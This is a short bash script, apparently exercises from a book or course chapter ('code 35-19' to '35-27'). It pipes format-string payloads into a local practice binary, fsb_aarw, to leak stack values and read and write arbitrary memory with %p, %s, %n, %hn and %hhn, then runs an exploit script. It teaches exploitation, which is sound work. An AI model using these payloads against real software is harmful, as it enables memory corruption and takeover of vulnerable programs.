#!/bin/bash

echo '### code 35-19'
echo 'aaaaaaaa %p %p %p %p %p %p %p %p %p' | ./fsb_aarw

echo '### code 35-20'
python3 -c "import sys; import struct; sys.stdout.buffer.write(b'%9\$p'.ljust(8,b'\x00') + struct.pack('<Q', 0x404020))" | ./fsb_aarw; echo

echo '### code 35-21'
python3 -c "import sys; import struct; sys.stdout.buffer.write(b'%9\$s'.ljust(8,b'\x00') + struct.pack('<Q', 0x404020))" | ./fsb_aarw | xxd

echo '### code 35-22'
python3 -c "import sys; import struct; sys.stdout.buffer.write(b'%9\$n'.ljust(8,b'\x00') + struct.pack('<Q', 0x404028))" | ./fsb_aarw | xxd

echo '### code 35-23'
python3 -c "import sys; import struct; sys.stdout.buffer.write(b'%258c%10\$n'.ljust(0x10,b'\x00') + struct.pack('<Q', 0x404028))" | ./fsb_aarw | xxd

echo '### code 35-27'
python3 -c "import sys; import struct; sys.stdout.buffer.write(b'%13\$ln%86c%14\$hhn%34c%13\$hhn%4540c%15\$hn'.ljust(0x28,b'\x00') + struct.pack('<QQQ', 0x404028, 0x404029, 0x40402A))" | ./fsb_aarw | xxd

stdbuf -o0 -e0 python3 ./exploit_fsb_aarw.py
